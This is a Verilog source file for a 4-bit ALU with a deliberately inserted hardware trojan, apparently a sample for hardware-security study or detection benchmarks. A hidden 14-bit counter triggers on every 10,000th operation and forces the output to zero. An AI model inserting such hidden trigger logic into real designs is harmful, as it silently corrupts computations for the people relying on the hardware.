// ============================================================================
// File       : alu_trojan_counter.v
// Description: 4-bit ALU with Counter-based Hardware Trojan
//              Trojan Trigger : Internal 14-bit counter reaches 10,000
//              Trojan Payload : Forces result to 4'b0000 on every
//                               10,000th operation (counter resets after)
// ============================================================================

module alu_trojan_counter (
    input  wire [3:0] A,
    input  wire [3:0] B,
    input  wire [1:0] op,
    output reg  [3:0] result,
    input  wire       clk,
    input  wire       rst
);

    // ----- Trojan Counter (hidden) -----
    reg [13:0] op_counter;     // Counts up to 10,000 (needs 14 bits)
    wire       trojan_trigger;

    assign trojan_trigger = (op_counter == 14'd9999); // 0-indexed: 9999 = 10,000th op

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            op_counter <= 14'd0;
        end else begin
            if (op_counter == 14'd9999) begin
                op_counter <= 14'd0;  // Reset after trigger
            end else begin
                op_counter <= op_counter + 14'd1;
            end
        end
    end

    // ----- ALU Logic with Trojan Payload -----
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            result <= 4'b0000;
        end else begin
            if (trojan_trigger) begin
                // Trojan Payload: zero out the result
                result <= 4'b0000;
            end else begin
                case (op)
                    2'b00: result <= A + B;   // ADD
                    2'b01: result <= A - B;   // SUB
                    2'b10: result <= A & B;   // AND
                    2'b11: result <= A | B;   // OR
                    default: result <= 4'b0000;
                endcase
            end
        end
    end

endmodule
